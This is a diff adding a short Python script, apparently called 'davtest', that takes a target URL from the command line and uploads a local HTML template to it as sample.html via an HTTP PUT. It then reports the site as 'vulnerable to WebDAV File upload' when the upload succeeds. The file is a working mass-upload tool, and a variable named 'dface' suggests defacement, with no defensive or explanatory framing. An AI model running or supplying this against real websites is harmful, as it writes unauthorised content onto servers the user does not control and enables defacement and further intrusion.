@@ -1,0 +1,44 @@
+#!/usr/bin/python3
+
+try:
+   import requests
+   import os.path
+   import sys
+   import os
+except ImportError:
+   exit("install requests and try again ...")
+
+
+def aox(script, site):
+   dface = "/"+script
+
+   op = open(script,"r").read()
+
+   s = requests.Session()
+
+   try:
+      site = site.strip()
+      if site.startswith("http://") is False:
+         site = "http://" + site
+
+      req = s.put(site+"/"+"sample.html", data=op)
+
+      print(f"[+] Checking {site}")
+      if req.status_code < 200 or req.status_code >= 250:
+        print("[-] The website is not vulnerable to WebDAV File upload !")
+      else:
+        invisible = site + "/sample.html"
+        print("[+] The website is vulnerable to WebDAV File upload !\n\n[!] site with uploaded file : {}".format(invisible))
+   except requests.exceptions.RequestException:
+       print("some error!!")
+
+a = "/app/templates/dav.html"
+
+try:
+ site = sys.argv[1]
+except:
+ print("\n[+] Usage : davtest [url]\n")
+ exit()
+
+aox(a, site)
+
